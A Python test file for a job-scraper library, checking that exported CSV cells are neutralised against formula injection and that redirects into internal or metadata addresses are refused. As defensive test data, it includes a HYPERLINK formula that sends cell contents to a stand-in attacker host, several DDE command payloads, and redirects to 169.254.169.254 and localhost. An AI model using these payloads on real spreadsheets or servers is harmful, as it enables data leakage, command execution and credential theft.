"""Two ways scraped input could act on the operator rather than inform them.

Both start from the same fact: every value and every URL in this engine came
off somebody else's page.
"""

from __future__ import annotations

import csv

from job_scraper.csv_safe import neutralise, safe_row
from job_scraper.transport import Outcome, RequestsTransport

# --------------------------------------------------------------------------
# CSV formula injection
# --------------------------------------------------------------------------


def test_a_formula_is_defused():
    """Both runbooks end with "import to Google Sheets"."""
    assert neutralise('=HYPERLINK("https://evil.test?x="&A1,"hi")').startswith("'=")


def test_the_dde_payload_is_defused():
    assert neutralise("=cmd|' /C calc'!A0").startswith("'=")


def test_at_and_pipe_prefixes_are_defused():
    assert neutralise("@SUM(1+1)*cmd").startswith("'@")
    assert neutralise("|cmd").startswith("'|")


def test_a_leading_tab_does_not_smuggle_a_formula_through():
    """Excel strips the control character before parsing, so "\\t=cmd" is
    still "=cmd" by the time it is evaluated."""
    assert neutralise("\t=cmd|' /C calc'!A0").startswith("'")


def test_a_european_phone_number_is_left_exactly_as_it_was():
    """The reason this is a module and not a one-line blanket prefix: a lead
    list is full of `+41 …` values, and putting an apostrophe in front of every
    phone number would be a visible defect in the deliverable."""
    for number in ("+41 44 123 45 67", "+49 (0)30 12345678", "+47 22 12 34 56"):
        assert neutralise(number) == number


def test_a_negative_number_is_left_alone():
    assert neutralise("-2500") == "-2500"


def test_a_payload_disguised_as_a_phone_number_is_still_defused():
    assert neutralise("+cmd|' /C calc'!A0").startswith("'+")


def test_ordinary_text_is_untouched():
    for value in ("Anna Meier", "Geschäftsführerin", "anna@firma.de", "https://firma.de", ""):
        assert neutralise(value) == value


def test_non_strings_pass_through_unchanged():
    assert neutralise(None) is None
    assert neutralise(42) == 42
    assert neutralise(3.5) == 3.5


def test_safe_row_leaves_keys_alone():
    row = safe_row({"person_name": "=cmd", "person_email": "a@b.de"})
    assert set(row) == {"person_name", "person_email"}
    assert row["person_name"].startswith("'=")
    assert row["person_email"] == "a@b.de"


def test_a_written_lead_csv_carries_no_live_formula(tmp_path):
    """End to end, through the real writer."""
    from leadgen.export import write_csv
    from leadgen.models import Lead

    lead = Lead(
        person_name='=HYPERLINK("https://evil.test","x")',
        person_email="anna@firma.de",
        person_phone="+41 44 123 45 67",
        company_domain="firma.de",
    )
    destination = tmp_path / "leads.csv"
    write_csv([lead], destination)

    with open(destination, encoding="utf-8-sig", newline="") as handle:
        row = next(iter(csv.DictReader(handle)))
    assert not row["person_name"].startswith("=")
    assert row["person_phone"] == "+41 44 123 45 67", "phone numbers stay readable"


# --------------------------------------------------------------------------
# SSRF through a redirect
# --------------------------------------------------------------------------


class _RedirectingSession:
    """A session that answers the first URL with a redirect to `target`."""

    def __init__(self, target: str) -> None:
        self.target = target
        self.requested: list[str] = []

    def get(self, url, **kwargs):
        self.requested.append(url)
        if len(self.requested) == 1:
            return _Response(302, {"Location": self.target}, "", url)
        return _Response(200, {}, "SECRET CREDENTIALS", url)


class _Response:
    def __init__(self, status, headers, text, url):
        self.status_code = status
        self.headers = headers
        self.text = text
        self.url = url
        self.encoding = "utf-8"
        self.apparent_encoding = "utf-8"
        self.cookies = {}


def test_a_redirect_into_link_local_space_is_refused():
    """The cloud-metadata attack. Every URL fetched here is attacker-influenced
    — a <loc> in somebody's sitemap, an apply_url out of a job ad — and
    guarding only the URL we were handed guards nothing if the response is a
    302 to 169.254.169.254."""
    session = _RedirectingSession("http://169.254.169.254/latest/meta-data/")
    result = RequestsTransport(session).fetch("https://evil.test/job/1")
    assert result.outcome is Outcome.ERROR
    assert "internal address space" in result.error
    assert len(session.requested) == 1, "the metadata endpoint must never be requested"


def test_a_redirect_to_localhost_is_refused():
    session = _RedirectingSession("http://127.0.0.1:8080/admin")
    result = RequestsTransport(session).fetch("https://evil.test/job/1")
    assert result.outcome is Outcome.ERROR
    assert len(session.requested) == 1


def test_an_ordinary_redirect_is_still_followed():
    """The guard must not break the very common http -> https and
    apex -> www hops."""
    session = _RedirectingSession("https://www.example.com/jobs")
    result = RequestsTransport(session).fetch("https://example.com/jobs")
    assert result.status == 200
    assert session.requested == ["https://example.com/jobs", "https://www.example.com/jobs"]


def test_a_redirect_loop_terminates():
    class _Loop:
        def __init__(self):
            self.count = 0

        def get(self, url, **kwargs):
            self.count += 1
            return _Response(302, {"Location": "https://example.com/again"}, "", url)

    session = _Loop()
    result = RequestsTransport(session).fetch("https://example.com/start")
    assert result.outcome is Outcome.ERROR
    assert "redirects" in result.error
    assert session.count <= 10, "a loop must not run away"
